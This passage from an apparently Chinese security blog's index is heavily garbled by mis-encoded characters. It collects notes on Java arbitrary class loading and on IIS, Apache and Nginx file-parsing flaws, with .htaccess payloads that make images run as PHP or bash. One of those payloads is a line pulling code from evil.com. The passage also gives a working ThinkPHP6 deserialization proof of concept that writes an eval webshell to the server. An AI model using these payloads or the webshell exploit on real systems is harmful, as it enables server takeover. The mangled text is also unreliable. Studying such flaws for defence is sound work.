å‡½æ•°æ‰§è¡Œä¹‹å‰æ‰§è¡Œï¼Œåœ¨ç±»ä¸­éƒ½å¯ä»¥å®šä¹‰å¤šä¸ªï¼Œä¸€èˆ¬åœ¨ä»£ç å—ä¸­å¯¹ä¸€äº›staticå˜é‡è¿›è¡Œèµ‹å€¼ã€‚</p><p>ä¸åŒç‚¹ï¼šé™æ€ä»£ç å—åœ¨éé™æ€ä»£ç å—ä¹‹å‰æ‰§è¡Œï¼ˆé™æ€ä»£ç å— &gt; éé™æ€ä»£ç å—ï¼‰ã€‚é™æ€ä»£ç å—åªåœ¨ç¬¬ä¸€æ¬¡newæ—¶æ‰§è¡Œä¸€æ¬¡ï¼Œä¹‹åä¸å†æ‰§è¡Œã€‚è€Œéé™æ€ä»£ç å—æ¯newä¸€æ¬¡å°±æ‰§è¡Œä¸€æ¬¡</p><p><strong>åŠ è½½ä¸ååºåˆ—åŒ–</strong></p><p>ç±»åŠ è½½çš„æ—¶å€™ä¼šæ‰§è¡Œä»£ç </p><p>åˆå§‹åŒ–ï¼šé™æ€ä»£ç å—</p><p>å®ä¾‹åŒ–ï¼šæ„é€ ä»£ç å—ï¼Œæ— å‚æ„é€ å‡½æ•°</p><p><strong>åŠ¨æ€ç±»åŠ è½½æ–¹æ³•</strong></p><p>Class.forname</p><p>åˆå§‹åŒ–/ä¸åˆå§‹åŒ–</p><p>ClassLoader.loadClassä¸è¿›è¡Œåˆå§‹åŒ–</p><p>åº•å±‚åŸç†ï¼Œå®ç°åŠ è½½ä»»æ„ç±»</p><p>ClassLoader-&gt;SecureClassLoader-&gt;URLClassLoader-&gt;AppClassLoader</p><p>loadClass-&gt;findClass(é‡å†™çš„æ–¹æ³•)-&gt;defineClass(ä»å­—èŠ‚ç åŠ è½½ç±»)</p><p>URLClassLoaderä»»æ„ç±»åŠ è½½ï¼šfile/http/jar</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">URLClassLoader urlClassloader = <span class="keyword">new</span> URLClassLoader(<span class="keyword">new</span> URL[]&#123;<span class="keyword">new</span> URL(<span class="string">&quot;file:///ç±»çš„è·¯å¾„&quot;</span>)&#125;);</span><br><span class="line">        Class&lt;?&gt; c = urlClassloader.loadClass(<span class="string">&quot;ç±»å&quot;</span>);</span><br><span class="line">        c.newInstance();</span><br></pre></td></tr></table></figure><p>defineClassåŒæ€åŠ è½½å­—èŠ‚ç ä»è€ŒåŠ è½½ä»»æ„ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ClassLoader cl = ClassLoader.getSystemClassLoader();</span><br><span class="line">        Method m = ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>,String.class, <span class="keyword">byte</span>[].class, <span class="keyword">int</span>.class, <span class="keyword">int</span>.class);</span><br><span class="line">        m.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\text\\class\\text.class&quot;</span>));</span><br><span class="line">        Class c = (Class)m.invoke(cl,<span class="string">&quot;text&quot;</span>,code,<span class="number">0</span>,code.length);</span><br><span class="line">        c.newInstance();</span><br></pre></td></tr></table></figure><p>java9åŠä»¥ä¸Šçš„ç‰ˆæœ¬ä¼šå‡ºç°æŠ¥é”™ï¼Œå¯åœ¨vm optionä¸­æ·»åŠ </p><blockquote><p>é”™è¯¯ï¼šmodule java.base does not â€œopens java.langâ€ to unnamed module</p><p>â€“add-opens java.base/java.lang=ALL-UNNAMED</p></blockquote><p>unsafe.defineClasså­—èŠ‚ç åŠ è½½publicç±»ä¸èƒ½ç›´æ¥ç”Ÿæˆï¼ˆéœ€è¦åå°„ï¼‰ï¼ŒSpringé‡Œé¢å¯ä»¥ç›´æ¥ç”Ÿæˆ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// è¿™ä¸ªå®ä¾‹ä»…é€‚ç”¨äºJava 8ä»¥å‰çš„ç‰ˆæœ¬ã€‚Java 11å¼€å§‹Unsafeç±»å·²ç»æŠŠdefineClassæ–¹æ³•ç§»é™¤äº†ã€‚</span></span><br><span class="line">ClassLoader cl = ClassLoader.getSystemClassLoader();</span><br><span class="line"> <span class="keyword">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\text\\class\\text.class&quot;</span>));</span><br><span class="line">        Class c = Unsafe.class;</span><br><span class="line">        Field unsafeField = c.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">        unsafeField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Unsafe unsafe = (Unsafe) unsafeField.get(<span class="keyword">null</span>);</span><br><span class="line">        Class c2 = unsafe.defineClass(<span class="string">&quot;text&quot;</span>,code,<span class="number">0</span>,code.length,cl,<span class="keyword">null</span>);</span><br><span class="line">        c2.newInstance();</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/u010398771/article/details/85319991">javaä¸­Unsafeä½¿ç”¨è®²è§£</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ä¸­é—´ä»¶æ–‡ä»¶è§£ææ¼æ´</title>
      <link href="/2022/05/09/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/"/>
      <url>/2022/05/09/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p>å½“ä¸€æ¬¡æ¬è¿å·¥</p><h1 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h1><h2 id="IIS-6-0"><a href="#IIS-6-0" class="headerlink" title="IIS 6.0"></a>IIS 6.0</h2><blockquote><p>åç¼€è§£æ /xx.asp;.jpg æœåŠ¡å™¨é»˜è®¤ä¸è§£æ ; å·åŠå…¶åé¢çš„å†…å®¹ï¼Œç›¸å½“äºæˆªæ–­<br> ç›®å½•è§£æ /xx.asp/xx.jpg(xx.aspç›®å½•ä¸‹ä»»æ„è§£æ)<br> é»˜è®¤è§£æ xx.asa xx.cer xx.cdx<br> PROPFIND æ ˆæº¢å‡ºæ¼æ´<br> RCE CVE-2017-7269</p></blockquote><h2 id="IIS-7-0-7-5-Nginx-lt-0-8-37"><a href="#IIS-7-0-7-5-Nginx-lt-0-8-37" class="headerlink" title="IIS 7.0-7.5 / Nginx &lt;= 0.8.37"></a>IIS 7.0-7.5 / Nginx &lt;= 0.8.37</h2><p>åœ¨Fast-CGIå¼€å¯çŠ¶æ€ä¸‹ï¼Œåœ¨æ–‡ä»¶è·¯å¾„ååŠ ä¸Š /xx.php ï¼Œå³ xx.jpg/xx.php ä¼šè¢«è§£æä¸ºphpæ–‡ä»¶ã€‚</p><h2 id="PUTæ¼æ´"><a href="#PUTæ¼æ´" class="headerlink" title="PUTæ¼æ´"></a>PUTæ¼æ´</h2><p>å¼€å¯WebDAV<br>æ‹¥æœ‰æ¥å®¾ç”¨æˆ·ï¼Œä¸”æ¥å®¾ç”¨æˆ·æ‹¥æœ‰ä¸Šä¼ æƒé™<br>å¯ä»»æ„æ–‡ä»¶ä¸Šä¼ </p><h2 id="Windowsç‰¹æ€§"><a href="#Windowsç‰¹æ€§" class="headerlink" title="Windowsç‰¹æ€§"></a>Windowsç‰¹æ€§</h2><p>Windowsä¸å…è®¸ç©ºæ ¼å’Œç‚¹ä»¥åŠä¸€äº›ç‰¹æ®Šå­—ç¬¦ä½œä¸ºç»“å°¾ï¼Œåˆ›å»ºè¿™æ ·çš„æ–‡ä»¶ä¼šè‡ªåŠ¨é‡å‘½åï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨ xx.php[ç©ºæ ¼] ï¼Œ xx.php.ï¼Œ xx.php/ï¼Œ xx.php::$DATA ä¸Šä¼ è„šæœ¬æ–‡ä»¶ã€‚</p><h2 id="æ–‡ä»¶åçŒœè§£"><a href="#æ–‡ä»¶åçŒœè§£" class="headerlink" title="æ–‡ä»¶åçŒœè§£"></a>æ–‡ä»¶åçŒœè§£</h2><p>åœ¨æ”¯æŒNTFS 8.3æ–‡ä»¶æ ¼å¼æ—¶ï¼Œå¯åˆ©ç”¨çŸ­æ–‡ä»¶åçŒœè§£ç›®å½•æ–‡ä»¶ã€‚å…¶ä¸­çŸ­æ–‡ä»¶åç‰¹å¾å¦‚ä¸‹ï¼š</p><p>æ–‡ä»¶åä¸ºåŸæ–‡ä»¶åå‰6ä½å­—ç¬¦åŠ ä¸Š ~1 ï¼Œå…¶ä¸­æ•°å­—éƒ¨åˆ†æ˜¯é€’å¢çš„ï¼Œå¦‚æœå­˜åœ¨å‰ç¼€ç›¸åŒçš„æ–‡ä»¶ï¼Œåˆ™åé¢çš„æ•°å­—è¿›è¡Œé€’å¢ã€‚<br>åç¼€åä¸è¶…è¿‡3ä½ï¼Œè¶…è¿‡éƒ¨åˆ†ä¼šè¢«æˆªæ–­<br>æ‰€æœ‰å°å†™å­—æ¯å‡è½¬æ¢æˆå¤§å†™çš„å­—æ¯<br>æ–‡ä»¶ååç¼€é•¿åº¦å¤§äºç­‰äº4æˆ–è€…æ€»é•¿åº¦å¤§äºç­‰äº9æ—¶æ‰ä¼šç”ŸæˆçŸ­æ–‡ä»¶åï¼Œå¦‚æœåŒ…å«ç©ºæ ¼æˆ–è€…å…¶ä»–éƒ¨åˆ†ç‰¹æ®Šå­—ç¬¦ï¼Œåˆ™æ— è§†é•¿åº¦æ¡ä»¶</p><p>IIS 8.0ä¹‹å‰çš„ç‰ˆæœ¬æ”¯æŒçŸ­æ–‡ä»¶åçŒœæµ‹çš„HTTPæ–¹æ³•ä¸»è¦åŒ…æ‹¬ï¼šDEBUGã€OPTIONSã€GETã€POSTã€HEADã€TRACEå…­ç§ï¼Œéœ€è¦å®‰è£…ASP.NETã€‚è€ŒIIS 8.0ä¹‹åçš„ç‰ˆæœ¬åªèƒ½é€šè¿‡OPTIONSå’ŒTRACEæ–¹æ³•çŒœæµ‹æˆåŠŸï¼Œä½†æ˜¯æ²¡æœ‰ASP.NETçš„é™åˆ¶ã€‚</p><p>è¿™ç§æ–¹æ³•çš„å±€é™æ€§åœ¨äºï¼š</p><p>æ–‡ä»¶å¤¹åå‰6ä½å­—ç¬¦å¸¦ç‚¹â€.â€ï¼Œæ‰«æç¨‹åºä¼šè®¤ä¸ºæ˜¯æ–‡ä»¶è€Œä¸æ˜¯æ–‡ä»¶å¤¹ï¼Œæœ€ç»ˆå‡ºç°è¯¯æŠ¥<br>ä¸æ”¯æŒä¸­æ–‡æ–‡ä»¶å</p><p>è¿™ç§æ–¹æ³•å¯ä»¥é€šè¿‡å‘½ä»¤ fsutil behavior set disable8dot3 1 å…³é—­NTFS 8.3æ–‡ä»¶æ ¼å¼çš„æ”¯æŒæ¥ä¿®å¤ã€‚</p><h1 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h1><h2 id="åç¼€è§£æ"><a href="#åç¼€è§£æ" class="headerlink" title="åç¼€è§£æ"></a>åç¼€è§£æ</h2><p>test.php.x1.x2.x3 ï¼ˆ x1,x2,x3 ä¸ºæ²¡æœ‰åœ¨ mime.types æ–‡ä»¶ä¸­å®šä¹‰çš„æ–‡ä»¶ç±»å‹ï¼‰ã€‚Apache å°†ä»å³å¾€å·¦å¼€å§‹åˆ¤æ–­åç¼€ï¼Œ è‹¥x3ä¸ºéå¯è¯†åˆ«åç¼€ï¼Œåˆ™åˆ¤æ–­x2ï¼Œç›´åˆ°æ‰¾åˆ°å¯è¯†åˆ«åç¼€ä¸ºæ­¢ï¼Œç„¶åå¯¹å¯è¯†åˆ«åç¼€è¿›è¡Œè§£æ</p><h2 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h2><p>å½“ AllowOverride è¢«å¯ç”¨æ—¶ï¼Œä¸Šä¼ å¯ç”¨è§£æè§„åˆ™çš„.htaccess</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_append_file .htaccess</span><br><span class="line"><span class="comment">#&lt;?php phpinfo();</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Options ExecCGI</span><br><span class="line">AddHandler cgi-script .jpg</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Options +ExecCGI</span><br><span class="line">AddHandler fcgid-script .gif</span><br><span class="line">FcgidWrapper <span class="string">&quot;/bin/bash&quot;</span> .gif</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php_flag allow_url_include <span class="number">1</span></span><br><span class="line">php_value auto_append_file data:<span class="comment">//text/plain;base64,PD9waHAgcGhwaW5mbygpOw==</span></span><br><span class="line"><span class="comment">#php_value auto_append_file data://text/plain,%3C%3Fphp+phpinfo%28%29%3B</span></span><br><span class="line"><span class="comment">#php_value auto_append_file https://evil.com/evil-code.txt</span></span><br></pre></td></tr></table></figure><h2 id="CVE-2017-15715"><a href="#CVE-2017-15715" class="headerlink" title="CVE-2017-15715"></a>CVE-2017-15715</h2><p>%0A ç»•è¿‡ä¸Šä¼ é»‘åå•ã€‚<br><a href="https://cloud.tencent.com/developer/article/1676145">Apache HTTPDæ¢è¡Œè§£ææ¼æ´</a></p><h2 id="lighttpd"><a href="#lighttpd" class="headerlink" title="lighttpd"></a>lighttpd</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx.jpg/xx.php</span><br></pre></td></tr></table></figure><h1 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h1><h2 id="Fast-CGIå…³é—­"><a href="#Fast-CGIå…³é—­" class="headerlink" title="Fast-CGIå…³é—­"></a>Fast-CGIå…³é—­</h2><p>åœ¨Fast-CGIå…³é—­çš„æƒ…å†µä¸‹ï¼Œ Nginx ä»ç„¶å­˜åœ¨è§£ææ¼æ´ï¼š åœ¨æ–‡ä»¶è·¯å¾„(xx.jpg)åé¢åŠ ä¸Š %00.php ï¼Œ å³ xx.jpg%00.php ä¼šè¢«å½“åš php æ–‡ä»¶æ¥è§£æ<br>å½±å“ä»¥ä¸‹ç‰ˆæœ¬</p><blockquote><p>Nginx 0.5.*<br>Nginx 0.6.*<br>Nginx 0.7 &lt;= 0.7.65<br>Nginx 0.8 &lt;= 0.8.37</p></blockquote><h2 id="Fast-CGIå¼€å¯"><a href="#Fast-CGIå¼€å¯" class="headerlink" title="Fast-CGIå¼€å¯"></a>Fast-CGIå¼€å¯</h2><p>åœ¨Fast-CGIå¼€å¯çŠ¶æ€ä¸‹ï¼Œåœ¨æ–‡ä»¶è·¯å¾„ååŠ ä¸Š /xx.php ï¼Œåˆ™ xx.jpg/xx.php ä¼šè¢«è§£æä¸ºphpæ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">phpçš„é…ç½®æ–‡ä»¶ php.ini æ–‡ä»¶ä¸­å¼€å¯äº† cgi.fix_pathinfo</span><br><span class="line"></span><br><span class="line">/etc/php5/fpm/pool.d/www.confä¸­ä¸æ­£ç¡®çš„é…ç½®security.limit_extensionsï¼Œå¯¼è‡´å…è®¸å°†å…¶ä»–æ ¼å¼æ–‡ä»¶ä½œä¸ºphpè§£ææ‰§è¡Œ</span><br></pre></td></tr></table></figure><h2 id="CVE-2013-4547"><a href="#CVE-2013-4547" class="headerlink" title="CVE-2013-4547"></a>CVE-2013-4547</h2><p>å½±å“nginxç‰ˆæœ¬ï¼šnginx 0.8.41 ~ 1.5.6</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a.jpg\x20\x00.php</span><br></pre></td></tr></table></figure><h2 id="é…ç½®é”™è¯¯"><a href="#é…ç½®é”™è¯¯" class="headerlink" title="é…ç½®é”™è¯¯"></a>é…ç½®é”™è¯¯</h2><h3 id="ç›®å½•ç©¿è¶Š"><a href="#ç›®å½•ç©¿è¶Š" class="headerlink" title="ç›®å½•ç©¿è¶Š"></a>ç›®å½•ç©¿è¶Š</h3><p>å¦‚æœé…ç½®ä¸­å­˜åœ¨ç±»ä¼¼ location /foo { alias /bar/; } çš„é…ç½®æ—¶ï¼Œ/foo../ ä¼šè¢«è§£æä¸º /bar/../ ä»è€Œå¯¼è‡´ç›®å½•ç©¿è¶Šçš„å‘ç”Ÿã€‚</p><h3 id="ç›®å½•éå†"><a href="#ç›®å½•éå†" class="headerlink" title="ç›®å½•éå†"></a>ç›®å½•éå†</h3><p>é…ç½®ä¸­ autoindex on å¼€å¯æ—¶ï¼ŒNginxä¸­å­˜åœ¨ç›®å½•éå†æ¼æ´ã€‚</p><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://www.cnblogs.com/yokan/p/12444476.html">æ–‡ä»¶è§£ææ¼æ´æ€»ç»“</a><br><a href="http://www.yongsheng.site/2022/01/14/%E4%B8%AD%E9%97%B4%E4%BB%B6/">å¤§ä½¬åšå®¢</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>thinkphp6æ¡†æ¶å­¦ä¹ &amp;ååºåˆ—åŒ–&amp;ä»»æ„å†™æ–‡ä»¶ åˆ†æ</title>
      <link href="/2022/05/09/thinkphp6%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0&amp;%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&amp;%E4%BB%BB%E6%84%8F%E5%86%99%E6%96%87%E4%BB%B6%20%E5%88%86%E6%9E%90/"/>
      <url>/2022/05/09/thinkphp6%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0&amp;%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&amp;%E4%BB%BB%E6%84%8F%E5%86%99%E6%96%87%E4%BB%B6%20%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="å¼€å‘æ‰‹å†Œ"><a href="#å¼€å‘æ‰‹å†Œ" class="headerlink" title="å¼€å‘æ‰‹å†Œ"></a>å¼€å‘æ‰‹å†Œ</h2><p><a href="https://www.kancloud.cn/manual/thinkphp6_0">think6æ¡†æ¶æ‰‹å†Œ</a><br>è‹¥æƒ³æå¼€å‘çœ‹å¤§ä½¬åšå®¢<br><a href="https://blog.csdn.net/qq_38626043?type=blog">PHP å¼€å‘ ThinkPHP6 æ¡†æ¶å­¦ä¹  ä¸€</a><br><a href="https://blog.csdn.net/qq_38626043/article/details/121317358?spm=1001.2014.3001.5502">PHPå¼€å‘ ThinkPHP6 æ¡†æ¶å­¦ä¹  äºŒ</a></p><h2 id="tp6ä¸‹è½½åŠé…ç½®"><a href="#tp6ä¸‹è½½åŠé…ç½®" class="headerlink" title="tp6ä¸‹è½½åŠé…ç½®"></a>tp6ä¸‹è½½åŠé…ç½®</h2><p><a href="https://blog.csdn.net/Quest_sec/article/details/105340807">ç”¨phpstudyéƒ¨ç½²thinkphp6 / ä½¿ç”¨æ•™ç¨‹</a><br>åˆ©ç”¨composeä¸‹è½½<br><a href="https://packagist.org/packages/topthink/think">ä¸‹è½½æŒ‡ä»¤ç½‘å€</a><br>é…ç½®<br><img src="https://img-blog.csdnimg.cn/ea7a3c8d2878438fa782ded800711efd.png"><br><img src="https://img-blog.csdnimg.cn/cb1764f2dd864250a634c85d6e7ff280.png"><br>ä½¿ç”¨composerå®‰è£…tp6 phpç‰ˆæœ¬åœ¨7.1ä»¥ä¸Š</p><h2 id="å¤ç°"><a href="#å¤ç°" class="headerlink" title="å¤ç°"></a>å¤ç°</h2><h3 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h3><p>å†™å…¥demo:<br>D:\phpstudy_pro\WWW\thinkphp6\app\controller\Index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">BaseController</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">BaseController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"><span class="variable">$unser</span> = <span class="string">&quot;&quot;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">unserialize(<span class="variable">$unser</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">League</span>\<span class="title">Flysystem</span>\<span class="title">Cached</span>\<span class="title">Storage</span>&#123;</span><br><span class="line"><span class="title">use</span> <span class="title">League</span>\<span class="title">Flysystem</span>\<span class="title">Filesystem</span>\<span class="title">AbstractAdapter</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">AbstractCache</span></span>&#123;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$autosave</span> = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Adapter</span> <span class="keyword">extends</span> <span class="title">AbstractCache</span></span>&#123;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$adapter</span>;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$file</span>;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$expire</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;file=<span class="string">&quot;cyxhack.php&quot;</span>;  <span class="comment">//æ–‡ä»¶åç§°</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;complete=<span class="string">&quot;&lt;?php eval(\$_POST[a]);?&gt;&quot;</span>;  <span class="comment">//å†…å®¹</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;adapter=<span class="keyword">new</span> \League\Flysystem\Adapter\Local();  <span class="comment">//has()æ–¹æ³•</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">League</span>\<span class="title">Flysystem</span>\<span class="title">Adapter</span>&#123;</span><br><span class="line"><span class="title">class</span> <span class="title">Local</span> <span class="title">extends</span> <span class="title">AbstractAdapter</span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="title">abstract</span> <span class="title">class</span> <span class="title">AbstractAdapter</span>&#123;</span><br><span class="line"><span class="title">protected</span> $<span class="title">pathPrefix</span> = &quot;./&quot;;  <span class="comment">//è¿™é‡Œè¿›è¡Œç›®å½•çš„æ›´æ”¹</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">$<span class="title">a</span> = <span class="title">new</span> \<span class="title">League</span>\<span class="title">Flysystem</span>\<span class="title">Cached</span>\<span class="title">Storage</span>\<span class="title">Adapter</span>();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å†™å…¥æœ¨é©¬<br><img src="https://img-blog.csdnimg.cn/b79986d17dd34bfe995e0a8cd48bc033.png"></p><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>å…¨å±€æœç´¢__destruct()<br><img src="https://img-blog.csdnimg.cn/a8defd503b8c4430ac7b703f2206b9f7.png"><br>åœ¨src/Storage/AbstractCache.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">AbstractCache</span> <span class="keyword">implements</span> <span class="title">CacheInterface</span></span></span><br></pre></td></tr></table></figure><p>å¦‚æœautosaveä¸ºfalseåˆ™æ‰§è¡Œsave()å‡½æ•°<br><img src="https://img-blog.csdnimg.cn/29dc9df67c334f218d0ba316c1083cc7.png"><br>æŸ¥æ‰¾save()å‡½æ•°<br>å‘ç°åœ¨<br><img src="https://img-blog.csdnimg.cn/0e75786ecc6f49f1bcfa51ad59d21cd9.png"><br>è·Ÿè¿›getForStorage()å‡½æ•°<br><img src="https://img-blog.csdnimg.cn/041dc6c3f39d498fb1e54492b13d518d.png"><br>å‘ç°å‚æ•°cache complete å’Œæ–¹æ³•cleanContents()åœ¨æŠ½è±¡ç±»ä¸­, expireåœ¨å½“å‰ç±»ä¸­<br>è·Ÿè¿›cleanContents()å‘ç°æ²¡ä»€ä¹ˆç”¨ï¼Œé‚£ä¹ˆåœ¨save()å‡½æ•°ä¸­$contentså‚æ•°æˆ‘ä»¬å¯æ§<br>æ¥ä¸‹æ¥è¿›è¡Œä¸€ä¸ªhas()æ–¹æ³•çš„åˆ¤æ–­ï¼Œæˆ‘ä»¬è‚¯å®šæ˜¯æƒ³è¿›è¡Œwrite()æ–¹æ³•ï¼Œé‚£ä¹ˆhas()å°±è¦è¿”å›ä¸€ä¸ªfalse<br>æœç´¢has()æ–¹æ³•ï¼Œåœ¨src/Adapter/Local.php<br><img src="https://img-blog.csdnimg.cn/1b3fa5321d4c4e4b8e1da71a1eff73b1.png"><br>è¿›åˆ°applyPathPrefix()<br><img src="https://img-blog.csdnimg.cn/8ed457c9afb34482bf633b43f8dd94dc.png"><br>è½¬åˆ°getPathPrefix()å‡½æ•°<br><img src="https://img-blog.csdnimg.cn/74157d07600144c187537a55e0efd11c.png"><br>è¿™é‡Œçš„getPathPrefix()å‡½æ•°å¯æ§ï¼Œè®©pathPrefixä¸º ./ å†é…åˆltrimå¯ä»¥æ§åˆ¶ä»»æ„å†™å…¥æ–‡ä»¶çš„ç›®å½•åœ°å€</p><p>ltrimæ„æ€æ˜¯å»é™¤ \ æœ€ç»ˆè¿”å›åˆ°has()çš„ file_exists($ location) å› ä¸ºè¿™é‡Œçš„$locationæ˜¯æˆ‘ä»¬å†™å…¥çš„æ–‡ä»¶å: ./cyxhack.phpä¸å­˜åœ¨ï¼Œæ‰€ä»¥è¿”å›false<br>ç„¶åå‘ä¸Šè¿”å›åˆ°write()å‡½æ•°ï¼Œå†™å…¥ä¸€å¥è¯</p><p><a href="http://www.yongsheng.site/2021/10/16/ThinkPHP%20v6.0.9%20save%28%29%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20%E4%BB%BB%E6%84%8F%E5%86%99%E6%96%87%E4%BB%B6/">å¤§ä½¬åšå®¢</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ATT&amp;CKçº¢é˜Ÿè¯„ä¼°å®æˆ˜é¶åœºï¼ˆä¸€ï¼‰</title>
